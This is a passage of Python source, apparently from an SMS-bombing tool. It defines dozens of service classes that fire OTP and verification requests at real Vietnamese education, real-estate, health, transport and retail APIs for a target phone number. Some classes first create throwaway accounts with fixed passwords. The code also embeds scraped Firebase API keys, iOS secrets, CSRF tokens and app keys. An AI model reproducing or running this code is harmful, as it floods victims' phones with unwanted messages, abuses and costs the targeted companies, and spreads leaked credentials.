    name = "PrepEdu"
    category = "education"
    active = True
    description = "PrepEdu - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://accounts.prep.vn/api/v1/auth/phone-otp/login',
            headers={
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': 'https://prepedu.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phone': phone_intl},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Babilala(Service):
    name = "Babilala"
    category = "education"
    active = True
    description = "Babilala - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.babilala.vn/api/getOtp',
            headers={
                'phone': phone,
                'accept': '*/*',
                'lang': 'vi',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Vinschool(Service):
    name = "Vinschool"
    category = "education"
    active = True
    description = "Vinschool - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'user-agent': 'Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            json={'phone_number': phone, 'unique_id': '274889DD-7051-4F23-9A28-F54E73F77A9A'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class MoonVN(Service):
    name = "MoonVN"
    category = "education"
    active = True
    description = "Moon.vn - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://identity.moon.vn/api/v2/user/register/regOTP',
            params={'phoneNumber': phone},
            headers={
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://moon.vn',
                'Referer': 'https://moon.vn/',
                'User-Agent': 'Mozilla/5.0',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Edupia(Service):
    name = "Edupia"
    category = "education"
    active = True
    description = "Edupia - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        self.session.post(
            'https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial',
            headers={
                'content-type': 'application/json',
                'user-agent': 'EDUPIA/3',
            },
            json={
                'app_code': 'edupia_cap1', 'app_version': '4.4.28',
                'device_os': 'Other', 'device_model': 'iOS1582',
                'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA', 'device_name': 'thanh',
                'parent_name': 'dat sen', 'phone': phone, 'product_type': '1',
                'source_register': 'App C1', 'campaign_name': 'Inhouse_Edupia TH App_Học thử_V2_Đăng ký',
            },
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode',
            headers={
                'content-type': 'application/json',
                'user-agent': 'EDUPIA/3',
            },
            json={
                'app_code': 'edupia_cap1', 'app_version': '4.4.28',
                'device_os': 'Other', 'device_model': 'iOS1582',
                'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA', 'device_name': 'thanh',
                'phone': phone, 'operation': 3,
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Vkids(Service):
    name = "Vkids"
    category = "education"
    active = True
    description = "Vkids - OTP đăng ký học thử"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'http://payment.api.deltago.com/api/auth/get-otp-vmg',
            headers={
                'app_version': '2.13.0', 'device_info': 'iPhone9,3',
                'lang_code': 'vi', 'bundleid': 'com.vkids.ios.abctiengviet',
                'platform': '1', 'User-Agent': 'VkidsABC/2.13.0.1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            data={
                'phone': phone[1:10], 'appKey': 'Ydfa76f765SA46HAA56sHFDMF8K4S5IK',
                'app_id': 'com.vkids.ios.abctiengviet',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: REALESTATE (Bất động sản, Nhà trọ, Nhà đất) =====
# =====================================================================

class MeeyLand(Service):
    name = "MeeyLand"
    category = "realestate"
    active = True
    description = "MeeyLand - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://v3.meeyid.com/auth/v4.3/login',
            headers={
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://meeyland.com',
                'x-client-id': 'meeyland',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'target': phone, 'type': 'phone', 'refCode': ''},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class ATMNha(Service):
    name = "ATMNha"
    category = "realestate"
    active = True
    description = "ATM Nhà - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.realtech247.com/v1/users/graphql',
            headers={
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://atmnha.vn',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={
                'operationName': 'sendCode',
                'variables': {'phone': phone, 'type': 'signUp', 'identifier': 'identifier'},
                'query': 'mutation sendCode($phone: String!, $type: SendVerificationCodeType, $identifier: String!) {\n  sendCode(phone: $phone, type: $type, identifier: $identifier) {\n    payload\n    success\n    msg\n    __typename\n  }\n}',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Lozido(Service):
    name = "Lozido"
    category = "realestate"
    active = True
    description = "Lozido - OTP quản lý trọ"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        self.session.post(
            'https://quanlytro.me/api/householder/v1/register',
            params={'_app_version': '1.9.9'},
            headers={'content-type': 'application/json', 'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0'},
            json={'name': 'user', 'phone': phone, 'password': '123123aA@', 'password_confirmation': '123123aA@'},
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://quanlytro.me/api/householder/v1/send-otp',
            params={'_app_version': '1.9.9'},
            headers={'content-type': 'application/json', 'user-agent': 'lozido_room_mobile/286 CFNetwork/1494.0.7 Darwin/23.4.0'},
            json={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class NhaDatVui(Service):
    name = "NhaDatVui"
    category = "realestate"
    active = True
    description = "Nhadatvui - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://nhadatvui.vn/user/register/phone',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://nhadatvui.vn',
                'Referer': 'https://nhadatvui.vn/user/register/phone',
                'User-Agent': 'Mozilla/5.0',
            },
            data={
                '_token': 'g5n9m9gJNIexHjrCiRgAujIM9cu5n9eRn3h26UGP',
                'g-token': '',
                'phone': phone,
                'password': '123123aA@',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class DalatBDS(Service):
    name = "DalatBDS"
    category = "realestate"
    active = True
    description = "Đà Lạt BDS - OTP Firebase"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params={'key': 'AIzaSyAoqJnJMlDHjlZuLPhvEVStfo4CvHax6t4'},
            headers={
                'content-type': 'application/json',
                'x-ios-bundle-identifier': 'com.dalatbds.ebroker',
                'user-agent': 'FirebaseAuth.iOS/10.15.0 com.dalatbds.ebroker/1.0.3',
            },
            json={
                'iosReceipt': 'AEFDNu8BB_sx6nGU_12r9zfctn8oRGR-V4NtfLbaKq8cSlpNf-sxTq7ay1MGIKpVQ0HSdxN2zCLTdyQxWdBmnd79QA5iBwND6OFpe4uDdCLNZcQ2KojI71RNcnuZ_WkBsg',
                'iosSecret': 'S2e5YvF91lUom3pY',
                'phoneNumber': f'+84{phone}',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


# =====================================================================
# ===== CATEGORY: OTHER (Các dịch vụ tiện ích, đặt xe, giải trí khác) =====
# =====================================================================

class VinWonders(Service):
    name = "VinWonders"
    category = "other"
    active = True
    description = "VinWonders/VinPearl - OTP booking"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://booking.vinwonders.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'channel': 10, 'UserName': phone_intl, 'Type': 1, 'OtpChannel': 1},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class MedigoZL(Service):
    name = "MedigoZL"
    category = "other"
    active = True
    description = "Medigo - OTP via Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://auth.medigoapp.com/prod/getOtp',
            params={'from': 'ZALO'},
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://www.medigoapp.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phone': phone_intl},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class MedigoSMS(Service):
    name = "MedigoSMS"
    category = "other"
    active = True
    description = "Medigo - OTP via SMS"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://auth.medigoapp.com/prod/getOtp',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': 'https://www.medigoapp.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            json={'phone': phone_intl},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Dynaminds(Service):
    name = "Dynaminds"
    category = "other"
    active = True
    description = "Dynaminds Hosting - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.dynaminds.vn/api/v1/oauth/register',
            headers={'Content-Type': 'application/json', 'User-Agent': 'Dynamic Hosting/1.4.1 CFNetwork/1494.0.7 Darwin/23.4.0'},
            json={'phone_number': phone, 'provider': 'self'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class VinFastEScooter(Service):
    name = "VinFastEScooter"
    category = "other"
    active = True
    description = "VinFast eScooter - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate',
            headers={
                'content-type': 'application/json',
                'accept': 'application/json',
                'app_version': '2.25.0',
                'platform': 'Ios',
                'user-agent': 'eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0',
            },
            json={'type': 'REGISTRATION', 'mobile_number': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Guvi(Service):
    name = "Guvi"
    category = "delivery"
    active = True
    description = "Guvi - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://server.guvico.com/customer/auth/register_phone',
            params={'lang': 'vi'},
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'Guvi/11 CFNetwork/1494.0.7 Darwin/23.4.0',
            },
            json={'code_phone_area': '+84', 'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Ting(Service):
    name = "Ting"
    category = "other"
    active = True
    description = "Ting.vn - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.ting.vn/users/request-otp-login',
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'TingUserApp/3 CFNetwork/1494.0.7 Darwin/23.4.0',
                'Authorization': 'Bearer null',
            },
            json={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Kanow(Service):
    name = "Kanow"
    category = "other"
    active = True
    description = "Kanow - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://system.kanow.vn/api/create_otp_sign_up',
            headers={
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': 'Kanow/2 CFNetwork/1494.0.7 Darwin/23.4.0',
            },
            json={'phone': phone, 'event': 'register'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class UniCar(Service):
    name = "UniCar"
    category = "other"
    active = True
    description = "UniCar - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.unicar.vn/uauth/login_phone',
            headers={
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'user-agent': 'unicar/9 CFNetwork/1494.0.7 Darwin/23.4.0',
            },
            json={'phoneNumber': phone_intl, 'app': 'uni', 'v': '34.10'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class ViecLam24H(Service):
    name = "ViecLam24H"
    category = "other"
    active = True
    description = "ViecLam24H - OTP đăng nhập"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.mobile.vieclam24h.vn/seeker/request-otp',
            headers={
                'content-type': 'application/json',
                'app-version': '1.10.0',
                'app-name': 'VIECLAM24H-MOBILE-APP',
                'user-agent': 'Vieclam24h/1 CFNetwork/1494.0.7 Darwin/23.4.0',
            },
            json={'type': 1, 'mobile': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class UPOS(Service):
    name = "UPOS"
    category = "other"
    active = True
    description = "UPOS - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.get(
            f'https://upos.vn/vn/home/send_brandname_otp/{phone}',
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class BigM(Service):
    name = "BigM"
    category = "other"
    active = True
    description = "BigM - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://base.bigm.vn/api/send-sms/opt',
            headers={
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            },
            data={'phone': phone},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class ZL188(Service):
    name = "ZL188"
    category = "other"
    active = True
    description = "188.com.vn - OTP Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://188.com.vn/get-token-auth-phone',
            headers={
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://188.com.vn',
                'user-agent': 'Mozilla/5.0',
                'x-csrf-token': '4KMnfF7jTrg7VbhqFm7eKxGv46otphQokZi5CeGV',
                'x-requested-with': 'XMLHttpRequest',
            },
            data={'phone': phone, 'otp_type': '1'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class TrungSonCareZL(Service):
    name = "TrungSonCareZL"
    category = "other"
    active = True
    description = "Trung Son Care - OTP Zalo"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://trungsoncare.com/index.php',
            params={'dispatch': 'loginbyOTP'},
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://trungsoncare.com',
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest',
            },
            data={
                'func': 'getotp', 'user_type': 'zalo', 'read_policy': '1',
                'ip_code': '84', 'user_login': phone, 'security_hash': '2e95aca90d025bc949785961ba432043',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class TrungSonCareSMS(Service):
    name = "TrungSonCareSMS"
    category = "other"
    active = True
    description = "Trung Son Care - OTP SMS"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://trungsoncare.com/index.php',
            params={'dispatch': 'loginbyOTP'},
            headers={
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://trungsoncare.com',
                'User-Agent': 'Mozilla/5.0',
                'X-Requested-With': 'XMLHttpRequest',
            },
            data={
                'func': 'getotp', 'user_type': 'sms', 'read_policy': '1',
                'ip_code': '84', 'user_login': phone, 'security_hash': '2e95aca90d025bc949785961ba432043',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class HomeID(Service):
    name = "HomeID"
    category = "other"
    active = True
    description = "HomeID - OTP đăng ký (Firebase)"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params={'key': 'AIzaSyBMwQDLKUqLZskG_4QBWSU79RUCYeXclwQ'},
            headers={
                'content-type': 'application/json',
                'x-ios-bundle-identifier': 'asia.homeid',
                'user-agent': 'FirebaseAuth.iOS/7.3.0 asia.homeid/1.1.6 iPhone/15.8.2',
            },
            json={
                'iosReceipt': 'AEFDNu_9qDiFRHvwruvGQjzmiO9YoKu03VGru0yCGiM6oKh6PfOTvTNPb5S2uv2EPQeHYSj_aMc9G71N3IMexyRojZqWz5g2z9rTFplJn__93x-tJkJge7g',
                'iosSecret': '1UHmX596jgq1PjGV', 'phoneNumber': phone_intl,
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Taskal(Service):
    name = "Taskal"
    category = "other"
    active = True
    description = "Tchat/Vinchat Telesafe - OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://tchat.telesafe.me/mytio/extotp/request.tio_x',
            headers={
                'content-type': 'application/json; charset=UTF-8',
                'tio-bundleid': 'vinchat', 'tio-appversion': '1.1.8',
                'tio-deviceinfo': 'iPhone XR', 'tio-cid': '59',
                'user-agent': 'VinTalk/1.1.8',
            },
            data={'country': '+84', 'deviceId': '6c452635e6b0465a9c91eb7c0c579d09', 'p_is_ios': '1', 'phone': phone[1:10]},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class StarT(Service):
    name = "StarT"
    category = "other"
    active = True
    description = "StarT - OTP đăng ký (Firebase)"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params={'key': 'AIzaSyA0EhB-nkhZxd6mkVCXg-jIwWdIcotqL8g'},
            headers={
                'content-type': 'application/json',
                'x-ios-bundle-identifier': 'com.ywmobile.rocket.star',
                'user-agent': 'FirebaseAuth.iOS/6.9.2 com.ywmobile.rocket.star/2.0.24',
            },
            json={
                'iosReceipt': 'AEFDNu_6rjcr3q-KWR56_JNNvcF72llii9GifB96ncXsPIpMf1BGoW-ylljFYYGlclZ5JdvBB54WDyKA6pLJMiUKj54fePMPam87XuG2j1mKIHefOuS06OZkP2xnC_57cx_tK88',
                'iosSecret': 'FPPFuD-2vXQRJWZL', 'phoneNumber': phone_intl,
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Gicula(Service):
    name = "Gicula"
    category = "other"
    active = True
    description = "Gicula - OTP Firebase"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params={'key': 'AIzaSyArzuGpJSuQjY4BTPYKYvWbwhQyj-kqASc'},
            headers={
                'content-type': 'application/json',
                'x-ios-bundle-identifier': 'com.gicula.gicula',
                'user-agent': 'FirebaseAuth.iOS/10.7.0 com.gicula.gicula/1.0.0',
            },
            json={
                'iosReceipt': 'AEFDNu8_Yf8zrW2KgVdtcYc_ZbgQNUfodc5BwLciW683p90mtt9WQ003Jl9exctAUMbeoOohuoh0F0dsLqXXl338Wr5lLApbo0PO2J5P89VV9WlqZbp7tYUie2rDvMw',
                'iosSecret': 'dQffunpOd3g77AuP', 'phoneNumber': phone_intl,
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class FPTAccount(Service):
    name = "FPTAccount"
    category = "other"
    active = True
    description = "FPT Account ID - OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://accounts.fpt.vn/sso/partial/username',
            headers={
                'Content-Type': 'application/json',
                'Origin': 'https://accounts.fpt.vn',
                'Referer': 'https://accounts.fpt.vn/sso/Auth/Identifier?challenge=c80cc09c52624b1cb657c56dab58b5df',
                'User-Agent': 'Mozilla/5.0',
                'X-CSRF-TOKEN': 'CfDJ8NeBk3ntjPdOi7d2FDqzzZ4zmAnjBXTetxuAdJ-mGohqqMxohUzIO6ZWrwGR8PMXpyFBhFjqVZ5JtGpF5MqNEpoYhjQP6iCLzAqkFPZDMHHptzd11xPhq0KoL3ddx1sbelFu2tj4UMhg-xCfNzgh1hE',
            },
            json={'Username': phone, 'Challenge': 'c80cc09c52624b1cb657c56dab58b5df'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class PingPush(Service):
    name = "PingPush"
    category = "other"
    active = True
    description = "PingPush CleanCall - OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        self.session.post(
            'https://cleancall-api.pingpush.vn:8443/user/forget_password',
            headers={
                'device': '06490740-8F1E-426C-98DC-BDC244123A08',
                'content-type': 'application/json',
                'devicename': 'iPhone',
                'user-agent': 'PPCallBlocker/3',
            },
            json={'username': phone},
            timeout=self.config["http"]["timeout"],
        )
        response = self.session.post(
            'https://cleancall-api.pingpush.vn:8443/user/create',
            headers={
                'device': '06490740-8F1E-426C-98DC-BDC244123A08',
                'content-type': 'application/json',
                'devicename': 'iPhone',
                'user-agent': 'PPCallBlocker/3',
            },
            json={'phone_number': phone, 'password': '123123aA@'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class ButlSMS(Service):
    name = "ButlSMS"
    category = "other"
    active = True
    description = "BUTL - OTP SMS đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://app-khach-v2.butl.vn/ButlAppServlet/user/services',
            headers={'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'BUTLUSER/1'},
            data=f'{{"cmd":"doRegister","data":{{"accessToken":"","platform":1,"deviceInfo":"iPhone XR","token":"1","countryCode":"84","email":"1","clientVersion":1,"deviceID":"AD475342-6B7B-4C93-AFAB-CE68811AC06C","name":"","phone":"{phone}","password":"123456","otp_method":"sms"}}}}',
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class ButlZL(Service):
    name = "ButlZL"
    category = "other"
    active = True
    description = "BUTL - OTP Zalo đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://app-khach-v2.butl.vn/ButlAppServlet/user/services',
            headers={'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': 'BUTLUSER/1'},
            data=f'{{"cmd":"doRegister","data":{{"accessToken":"","platform":1,"deviceInfo":"iPhone XR","token":"1","countryCode":"84","email":"1","clientVersion":1,"deviceID":"AD475342-6B7B-4C93-AFAB-CE68811AC06C","name":"","phone":"{phone}","password":"123456","otp_method":"zalo"}}}}',
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class SoBanHangZL(Service):
    name = "SoBanHangZL"
    category = "other"
    active = True
    description = "SoBanHang - OTP Zalo đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.sobanhang.com/finan-user/api/v2/auth/account/request',
            headers={'content-type': 'application/json', 'user-agent': 'finan/2', 'x-current-version': '3.1.3'},
            json={
                'phone_number': phone, 'pwd': None, 'platform': 'gtapp',
                'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7', 'action': 'create_account',
                'email': 'boyssss5@gmail.com', 'receiving_method': 'phone_number', 'is_send_zns': True,
                'secret_key': 'df753c9cb291dfd4789cc95834211ac34c509a90fb80c2c8a8430acb3cdda8ab3d8a9176b98fb10ac04a2c47f6b5c72fd4386a',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class SoBanHangSMS(Service):
    name = "SoBanHangSMS"
    category = "other"
    active = True
    description = "SoBanHang - OTP SMS đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://api.sobanhang.com/finan-user/api/v2/auth/account/request',
            headers={'content-type': 'application/json', 'user-agent': 'finan/2', 'x-current-version': '3.1.3'},
            json={
                'phone_number': phone, 'action': 'create_account', 'platform': 'gtapp',
                'device_id': '796B9301-42DF-4340-BFDF-D415E8E0F5C7', 'receiving_method': 'phone_number',
                'is_send_zns': False,
                'secret_key': '1b30cd4319584f071d51f40e4528f03992be48da3538a09cc0c9aee4655c331acd941dc0e169c3d82eade9f3f52cc86cafb535',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class Sapo(Service):
    name = "Sapo"
    category = "other"
    active = True
    description = "Sapo - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.post(
            'https://accounts.sapo.vn/register',
            headers={
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://app.sapo.vn',
                'user-agent': 'Mozilla/5.0',
            },
            data={
                'CountryCode': '84', 'FullName': 'duy dub', 'PhoneNumber': phone,
                'StoreName': 'huy bb6', 'PackageTitle': 'mobile_v3',
                'City': 'Hồ Chí Minh', 'Source': 'iphone', 'Type': '1',
            },
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class TrueDoc(Service):
    name = "TrueDoc"
    category = "other"
    active = True
    description = "TrueDoc AIHealth - OTP"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        response = self.session.get(
            'https://mapi.aihealth.vn/api/mobile/v1/sso/register/key',
            params={
                'Phone': phone, 'CountryCode': '84',
                'DeviceId': '5308E878-5785-4579-B17D-736E1E008E47',
                'UuidByKeychain': '5308E878-5785-4579-B17D-736E1E008E47',
                'GrantType': 'register_key',
            },
            headers={'accept': 'application/json', 'user-agent': 'AI_HEALTH/14'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class HVB(Service):
    name = "HVB"
    category = "other"
    active = True
    description = "MuaNgay HVB - OTP đăng ký"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        email = generate_random_email()
        response = self.session.post(
            'https://api-app.muangay-vn.com/api/outlet/register/info',
            headers={
                'locale': 'vi', 'accept': 'multipart/form-data',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'UMenu/433 CFNetwork/1494.0.7',
            },
            data={'mobilePhone': phone, 'userName': 'tran duc', 'name': email, 'roleId': '2'},
            timeout=self.config["http"]["timeout"],
        )
        return ServiceResult(success=response.ok, message=response.text[:200], status_code=response.status_code)


class HoaToc247(Service):
    name = "HoaToc247"
    category = "other"
    active = True
    description = "HoaToc247 - OTP quên mật khẩu"

    def execute(self, phone: str, phone_intl: str) -> ServiceResult:
        self.session.post(
            'https://api.hoatoc247.com:8080/v1/auth/signup',
            headers={
